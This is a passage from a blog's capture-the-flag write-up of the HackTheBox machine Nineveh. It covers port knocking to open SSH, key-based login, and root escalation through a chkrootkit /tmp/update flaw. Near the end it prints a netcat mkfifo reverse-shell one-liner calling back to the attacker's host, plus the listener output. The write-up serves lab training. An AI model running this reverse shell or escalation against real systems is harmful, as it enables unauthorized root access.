<span class="go">Active Internet connections (only servers)                                                                                                                                                    </span>
<span class="go">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span>
<span class="go">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                </span>
<span class="go">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                </span>
<span class="go">tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -                                                                                                             </span>
<span class="go">tcp6       0      0 :::22                   :::*                    LISTEN      -                  </span>
</pre></div>


<p>In reality port 22 is listening as we can see above. The reason the nmap did not reveal is because of iptables which only allows connections for port 80 and 443:</p>
<div class="highlight"><pre><span></span><span class="gp">www-data@nineveh:/$</span> cat /etc/iptables/rules.v4
<span class="gp">#</span> Generated by iptables-save v1.6.0 on Sun Jul  <span class="m">2</span> <span class="m">19</span>:37:15 <span class="m">2017</span>
<span class="go">*filter</span>
<span class="go">:INPUT ACCEPT [0:0]</span>
<span class="go">:FORWARD ACCEPT [0:0]</span>
<span class="go">:OUTPUT ACCEPT [140:21895]</span>
<span class="go">-A INPUT -p icmp -j ACCEPT</span>
<span class="go">-A INPUT -i lo -j ACCEPT</span>
<span class="go">-A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT</span>
<span class="go">-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT</span>
<span class="go">-A INPUT -p tcp -m tcp --dport 443 -j ACCEPT</span>
<span class="go">-A INPUT -j DROP</span>
<span class="go">COMMIT</span>
<span class="gp">#</span> Completed on Sun Jul  <span class="m">2</span> <span class="m">19</span>:37:15 <span class="m">2017</span>
</pre></div>


<p>I went back to LinEnum output and I found that the knockd daemon is running:</p>
<div class="highlight"><pre><span></span><span class="go">root      1282  1.1  0.2   8756  2228 ?        Ss   04:11   2:52 /usr/sbin/knockd -d -i ens33</span>
</pre></div>


<p>and the below could be the configuration file:</p>
<div class="highlight"><pre><span></span><span class="go">-rw-r--r-- 1 root root 354 Aug  5  2017 /etc/knockd.conf</span>
</pre></div>


<p>The knockd daemon is needed to have the so called <strong>Port Knocking</strong> mechanism work properly.</p>
<p>Port knocking is a mechanism used to enable remote access without leaving a port open constantly. This helps protecting a port being used from port scanning.</p>
<p>To use port knocking, the server must have a firewall and run the knock-daemon, /usr/sbin/knockd. The daemon is listening for a specific sequence of TCP or UDP packets, if the sequence of packets is correct, then usually the source IP address of the port knocking is given access through the firewall to the assigned knocking port. </p>
<div class="highlight"><pre><span></span><span class="gp">www-data@nineveh:/home$</span> cat /etc/knockd.conf 
<span class="go">[options]</span>
<span class="go"> logfile = /var/log/knockd.log</span>
<span class="go"> interface = ens33</span>

<span class="go">[openSSH]</span>
<span class="go"> sequence = 571, 290, 911 </span>
<span class="go"> seq_timeout = 5</span>
<span class="go"> start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT</span>
<span class="go"> tcpflags = syn</span>

<span class="go">[closeSSH]</span>
<span class="go"> sequence = 911,290,571</span>
<span class="go"> seq_timeout = 5</span>
<span class="go"> start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT</span>
<span class="go"> tcpflags = syn</span>
</pre></div>


<p>From the above configuration file we can see that the port sequense for openSSH is 571, 290, 911. If our kali machine sends three TCP packets to these ports in this exact sequence then port 22 will be open.</p>
<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> nmap -p <span class="m">22</span> <span class="m">10</span>.10.10.43
<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-19 18:53 GMT</span>
<span class="go">Nmap scan report for nineveh.htb (10.10.10.43)</span>
<span class="go">Host is up (0.024s latency).</span>

<span class="go">PORT   STATE    SERVICE</span>
<span class="go">22/tcp filtered ssh</span>

<span class="go">Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds</span>
</pre></div>


<p>Before starting to test this, we can see the above output shows that port 22 is filtered (by iptables in this case).</p>
<p>Looking online I found out that it is possible to use nmap and I found a command <a href="https://wiki.archlinux.org/index.php/Port_knocking">here</a> which will be useful. This is the script:</p>
<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:/home/user/Tools#</span> nmap -Pn --host-timeout <span class="m">100</span> --max-retries <span class="m">0</span>  -p <span class="m">571</span>,290,911 <span class="m">10</span>.10.10.43
<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-19 19:11 GMT</span>
<span class="go">Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).</span>
<span class="go">Nmap scan report for nineveh.htb (10.10.10.43)</span>
<span class="go">Host is up.</span>

<span class="go">PORT    STATE    SERVICE</span>
<span class="go">290/tcp filtered unknown</span>
<span class="go">571/tcp filtered umeter</span>
<span class="go">911/tcp filtered xact-backup</span>
</pre></div>


<p>I ran the above command few times and when I check again for por 22 I get this:</p>
<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:/home/user/Tools#</span> nmap -p <span class="m">22</span> <span class="m">10</span>.10.10.43
<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-19 19:11 GMT</span>
<span class="go">Nmap scan report for nineveh.htb (10.10.10.43)</span>
<span class="go">Host is up (0.017s latency).</span>

<span class="go">PORT   STATE SERVICE</span>
<span class="go">22/tcp open  ssh</span>

<span class="go">Nmap done: 1 IP address (1 host up) scanned in 0.14 seconds</span>
</pre></div>


<p>Now port 22 is open and we can try to SSH.</p>
<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:/home/user/Documents/htb/boxes/nineveh/_nineveh.png.extracted/secret#</span> ssh amrois@10.10.10.43 -i nineveh.priv
<span class="go">Ubuntu 16.04.2 LTS</span>
<span class="go">Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)</span>

<span class="go"> * Documentation:  https://help.ubuntu.com</span>
<span class="go"> * Management:     https://landscape.canonical.com</span>
<span class="go"> * Support:        https://ubuntu.com/advantage</span>

<span class="go">133 packages can be updated.</span>
<span class="go">66 updates are security updates.</span>


<span class="go">You have mail.</span>
<span class="go">Last login: Sun Jan 19 15:15:39 2020 from 10.10.14.5</span>

<span class="gp">amrois@nineveh:~$</span> id
<span class="go">uid=1000(amrois) gid=1000(amrois) groups=1000(amrois)</span>
</pre></div>


<p>Finally we are in as the user <strong>amrois</strong> and we can get the user.txt</p>
<div class="highlight"><pre><span></span><span class="gp">amrois@nineveh:~$</span> cat user.txt 
<span class="go">82############################c8</span>
</pre></div>


<p>Looking around I notice there a non-default directory calle report which is owned by the user amrois:</p>
<div class="highlight"><pre><span></span><span class="gp">amrois@nineveh:/$</span> ll
<span class="go">total 100</span>
<span class="go">drwxr-xr-x  24 root   root    4096 Jul  2  2017 ./</span>
<span class="go">drwxr-xr-x  24 root   root    4096 Jul  2  2017 ../</span>
<span class="go">drwxr-xr-x   2 root   root    4096 Jul  2  2017 bin/</span>
<span class="go">drwxr-xr-x   3 root   root    4096 Jul  2  2017 boot/</span>
<span class="go">drwxr-xr-x  19 root   root    4240 Jan 19 04:11 dev/</span>
<span class="go">drwxr-xr-x  93 root   root    4096 Aug  5  2017 etc/</span>
<span class="go">drwxr-xr-x   3 root   root    4096 Jul  2  2017 home/</span>
<span class="go">lrwxrwxrwx   1 root   root      32 Jul  2  2017 initrd.images -&gt; boot/initrd.images-4.4.0-62-generic</span>
<span class="go">drwxr-xr-x  22 root   root    4096 Jul  2  2017 lib/</span>
<span class="go">drwxr-xr-x   2 root   root    4096 Jul  2  2017 lib64/</span>
<span class="go">drwx------   2 root   root   16384 Jul  2  2017 lost+found/</span>
<span class="go">drwxr-xr-x   3 root   root    4096 Jul  2  2017 media/</span>
<span class="go">drwxr-xr-x   2 root   root    4096 Feb 15  2017 mnt/</span>
<span class="go">drwxr-xr-x   2 root   root    4096 Feb 15  2017 opt/</span>
<span class="go">dr-xr-xr-x 208 root   root       0 Jan 19 04:11 proc/</span>
<span class="go">drwxr-xr-x   2 amrois amrois  4096 Jan 19 15:20 report/</span>
<span class="go">drwx------   4 root   root    4096 Jul 19  2017 root/</span>
<span class="go">drwxr-xr-x  23 root   root     900 Jan 19 15:16 run/</span>
<span class="go">drwxr-xr-x   2 root   root   12288 Jul  2  2017 sbin/</span>
<span class="go">drwxr-xr-x   2 root   root    4096 Jan 14  2017 snap/</span>
<span class="go">drwxr-xr-x   2 root   root    4096 Feb 15  2017 srv/</span>
<span class="go">dr-xr-xr-x  13 root   root       0 Jan 19 06:11 sys/</span>
<span class="go">drwxrwxrwt   9 root   root    4096 Jan 19 15:20 tmp/</span>
<span class="go">drwxr-xr-x  10 root   root    4096 Jul  2  2017 usr/</span>
<span class="go">drwxr-xr-x  14 root   root    4096 Jul  2  2017 var/</span>
<span class="go">lrwxrwxrwx   1 root   root      29 Jul  2  2017 vmlinuz -&gt; boot/vmlinuz-4.4.0-62-generic</span>
</pre></div>


<p>inside the directory there are some text files which look they are generated every minute:</p>
<div class="highlight"><pre><span></span><span class="gp">amrois@nineveh:/report$</span> ls -l
<span class="go">total 24</span>
<span class="go">-rw-r--r-- 1 amrois amrois 4835 Jan 19 15:20 report-20-01-19:15:20.txt</span>
<span class="go">-rw-r--r-- 1 amrois amrois 4835 Jan 19 15:21 report-20-01-19:15:21.txt</span>
<span class="go">-rw-r--r-- 1 amrois amrois 4835 Jan 19 15:22 report-20-01-19:15:22.txt</span>
</pre></div>


<div class="highlight"><pre><span></span><span class="gp">amrois@nineveh:/report$</span> ls -l
<span class="go">total 32</span>
<span class="go">-rw-r--r-- 1 amrois amrois 4835 Jan 19 15:20 report-20-01-19:15:20.txt</span>
<span class="go">-rw-r--r-- 1 amrois amrois 4835 Jan 19 15:21 report-20-01-19:15:21.txt</span>
<span class="go">-rw-r--r-- 1 amrois amrois 4835 Jan 19 15:22 report-20-01-19:15:22.txt</span>
<span class="go">-rw-r--r-- 1 amrois amrois 4835 Jan 19 15:23 report-20-01-19:15:23.txt</span>
</pre></div>


<div class="highlight"><pre><span></span><span class="gp">amrois@nineveh:/report$</span> ls -l
<span class="go">total 40</span>
<span class="go">-rw-r--r-- 1 amrois amrois 4835 Jan 19 15:20 report-20-01-19:15:20.txt</span>
<span class="go">-rw-r--r-- 1 amrois amrois 4835 Jan 19 15:21 report-20-01-19:15:21.txt</span>
<span class="go">-rw-r--r-- 1 amrois amrois 4835 Jan 19 15:22 report-20-01-19:15:22.txt</span>
<span class="go">-rw-r--r-- 1 amrois amrois 4835 Jan 19 15:23 report-20-01-19:15:23.txt</span>
<span class="go">-rw-r--r-- 1 amrois amrois 4835 Jan 19 15:24 report-20-01-19:15:24.txt</span>
</pre></div>


<p>This may be an indication that a cronjob is running.</p>
<div class="highlight"><pre><span></span><span class="gp">amrois@nineveh:/report$</span> crontab -l
<span class="gp">#</span> Edit this file to introduce tasks to be run by cron.
<span class="gp">#</span> 
<span class="gp">#</span> Each task to run has to be defined through a single line
<span class="gp">#</span> indicating with different fields when the task will be run
<span class="gp">#</span> and what <span class="nb">command</span> to run <span class="k">for</span> the task
<span class="gp">#</span> 
<span class="gp">#</span> To define the <span class="nb">time</span> you can provide concrete values <span class="k">for</span>
<span class="gp">#</span> minute <span class="o">(</span>m<span class="o">)</span>, hour <span class="o">(</span>h<span class="o">)</span>, day of month <span class="o">(</span>dom<span class="o">)</span>, month <span class="o">(</span>mon<span class="o">)</span>,
<span class="gp">#</span> and day of week <span class="o">(</span>dow<span class="o">)</span> or use <span class="s1">&#39;*&#39;</span> in these fields <span class="o">(</span><span class="k">for</span> <span class="s1">&#39;any&#39;</span><span class="o">)</span>.# 
<span class="gp">#</span> Notice that tasks will be started based on the cron<span class="s1">&#39;s system</span>
<span class="gp">#</span><span class="s1"> daemon&#39;</span>s notion of <span class="nb">time</span> and timezones.
<span class="gp">#</span> 
<span class="gp">#</span> Output of the crontab <span class="nb">jobs</span> <span class="o">(</span>including errors<span class="o">)</span> is sent through
<span class="gp">#</span> email to the user the crontab file belongs to <span class="o">(</span>unless redirected<span class="o">)</span>.
<span class="gp">#</span> 
<span class="gp">#</span> For example, you can run a backup of all your user accounts
<span class="gp">#</span> at <span class="m">5</span> a.m every week with:
<span class="gp">#</span> <span class="m">0</span> <span class="m">5</span> * * <span class="m">1</span> tar -zcf /var/backups/home.tgz /home/
<span class="gp">#</span> 
<span class="gp">#</span> For more information see the manual pages of crontab<span class="o">(</span><span class="m">5</span><span class="o">)</span> and cron<span class="o">(</span><span class="m">8</span><span class="o">)</span>
<span class="gp">#</span> 
<span class="gp">#</span> m h  dom mon dow   <span class="nb">command</span>
<span class="go">*/10 * * * * /usr/sbin/report-reset.sh</span>
</pre></div>


<p>The above crontab indicates there is a script running every 10 minutes. </p>
<div class="highlight"><pre><span></span><span class="gp">#</span>!/bin/bash

<span class="go">rm -rf /report/*.txt</span>
</pre></div>


<p>and the above confirms this is a script that empties the report directory. We still need to find out what generates these reports. I copied some of the rows of the report on google and I found multiple results (i.e. https://www.linuxquestions.org/questions/fedora-35/when-i-chkrootkit-it-says-354711/) referring to <a href="http://www.chkrootkit.org/">chkrootkit</a>. So I am pretty sure it's the application generating the reports.</p>
<p>Having a look with searchsploit I found exploit 33899 which in summary states the following:</p>
<div class="highlight"><pre><span></span><span class="go">Steps to reproduce:</span>

<span class="go">- Put an executable file named &#39;update&#39; with non-root owner in /tmp (not</span>
<span class="go">mounted noexec, obviously)</span>
<span class="go">- Run chkrootkit (as uid 0)</span>

<span class="go">Result: The file /tmp/update will be executed as root, thus effectively</span>
<span class="go">rooting your box, if malicious content is placed inside the file.</span>
</pre></div>


<p>So I create a file named update in the /tmp directory and I punt a shell inside:</p>
<div class="highlight"><pre><span></span><span class="gp">amrois@nineveh:/tmp$</span> cat update
<span class="go">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.5 1234 &gt;/tmp/f</span>
</pre></div>


<p>and after waiting around 1 minute I get the shell back:</p>
<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:/home/user/Tools/linenum#</span> nc -lvnp <span class="m">1234</span>
<span class="go">listening on [any] 1234 ...</span>
<span class="go">connect to [10.10.14.5] from (UNKNOWN) [10.10.10.43] 45922</span>
<span class="go">/bin/sh: 0: can&#39;t access tty; job control turned off</span>
<span class="gp">#</span> id
<span class="go">uid=0(root) gid=0(root) groups=0(root)</span>
</pre></div>


<div class="highlight"><pre><span></span><span class="gp">#</span> cat root.txt            
<span class="go">8a############################3a</span>
</pre></div>
			<style>
#pcs-comment-form input,
#pcs-comment-form textarea {
	width: 100%;
}
#pcs-comment-form-display-replyto {
	border: solid 1px black;
	padding: 2px;
}
#pcs-comment-form-display-replyto p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}
#pcs-comments ul {
	list-style: none;
}
#pcs-comments .comment-left {
	display: table-cell;
	padding-right: 10px;
}
#pcs-comments .comment-body {
	display: table-cell;
	vertical-align: top;
	width: 100%;
}
</style>

	<section id="pcs-comments">
	<header>
		<h2>Comments</h2>
		<hr/>
	</header>
		<p>There are no comments yet.</p>
	<section>
	<form id="pcs-comment-form" action="#">
		<legend>Add a Comment</legend>
		<input type="hidden" id="pcs-comment-form-input-replyto">
		<fieldset>
			<label for="pcs-comment-form-input-name">Name</label>
			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
		</fieldset>
		<fieldset>
			<label for="pcs-comment-form-input-website">Website</label>
			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
		</fieldset>
		<fieldset>
			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
		</fieldset>

		<button type="submit"
				id="pcs-comment-form-button-submit"
				>Post via email</button>

			<a href="https://sittingducks.io/feeds/comment.Nineveh.atom.xml">
				Comment Atom Feed
			</a>
	</form>
</section>

</section>

			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
	<script type="text/javascript">
		$(document).ready(function() {
			CommentSystem.email_user   = "sittingducks.io";
			CommentSystem.email_domain = "protonmail.com";
			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
				return ''
					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
					+ 	'×'
					+ '</button>'
					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
			};

			$('#pcs-comment-form').on("submit",
				function( event )
				{
					event.preventDefault();
					$(location).attr('href', CommentSystem.getMailtoLink("Nineveh"));
				}
			);
		});
	</script>


      </div><!-- .entry-content -->
      <br /><br />
      <div class="article_meta">
        Tags:
          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
    </div>
  </div>
</article><!-- #post-## -->
                </div>
              </div><!-- #main -->
          </div><!-- #primary -->
        </div>
      </div><!-- close .row -->
    </div><!-- close .container -->
  </div><!-- close .site-content -->




  <div id="footer-area">
    <footer id="colophon" class="site-footer" role="contentinfo">
      <div class="site-info container">
        <div class="row">
                    <div class="copyright col-md-12">
                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
        </div>
      </div><!-- .site-info -->
      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
    </footer><!-- #colophon -->
  </div>

  <script type="text/javascript">
    window.addEventListener('load', function(){
    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
      window.scroll(0, document.getElementById('main').offsetTop);
    }})
  </script>

  
 <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
	<!-- Make sure jquery is loaded first, then load colorbox -->
  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>


  
  
</body>
</html>